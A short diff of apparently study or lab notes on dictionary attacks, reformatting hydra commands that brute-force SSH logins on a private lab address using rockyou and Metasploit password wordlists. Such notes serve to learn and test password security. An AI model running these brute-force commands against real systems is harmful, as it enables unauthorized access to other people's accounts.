@@ -57,9 +57,7 @@ dictionary attack
 `hydra -l student -P /usr/share/wordlist/rockyou.txt 192.168.7.3 ssh`
 
 ```bash
-hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
--P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
-192.168.7.3 -t 4 ssh 
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.7.3 -t 4 ssh 
 ```
 
 ---
